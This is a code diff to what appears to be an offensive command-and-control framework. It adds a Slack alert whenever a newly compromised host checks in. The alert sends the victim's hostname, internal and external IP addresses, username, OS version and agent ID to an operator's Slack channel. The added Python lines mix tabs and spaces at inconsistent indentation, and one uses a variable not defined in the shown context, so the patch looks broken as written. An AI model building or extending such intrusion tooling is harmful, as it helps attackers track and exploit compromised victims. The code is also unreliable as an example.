@@ -1321,10 +1321,17 @@ class Agents:
             # update the agent with this new information
             self.mainMenu.agents.update_agent_sysinfo_db(sessionID, listener=listenerName, internal_ip=internal_ip, username=username, hostname=hostname, os_details=os_details, high_integrity=high_integrity, process_name=process_name, process_id=process_id, language_version=language_version, language=language)
 
-            # signal everyone that this agent is now active
-            dispatcher.send("[+] Initial agent %s from %s now active" % (sessionID, clientIP), sender='Agents')
+            # signal to Slack that this agent is now active
             output = "[+] Agent %s now active:\n" % (sessionID)
-
+	    slackToken = listenerOptions['SlackToken']['Value']
+	    slackChannel = listenerOptions['SlackChannel']['Value']
+	    if slackToken != "":
+	    	slackText = ":biohazard: NEW AGENT :biohazard:\r\n```Machine Name: %s\r\nInternal IP: %s\r\nExternal IP: %s\r\nUser: %s\r\nOS Version: %s\r\nAgent ID: %s```" % (hostname,internal_ip,external_ip,username,os_details,sessionID)
+                helpers.slackMessage(slackToken,slackChannel,slackText)
+            
+	    # signal everyone that this agent is now active
+            dispatcher.send("[+] Initial agent %s from %s now active (Slack)" % (sessionID, clientIP), sender='Agents')
+	    
             # save the initial sysinfo information in the agent log
             agent = self.mainMenu.agents.get_agent_db(sessionID)
             output = messages.display_agent(agent, returnAsString=True)
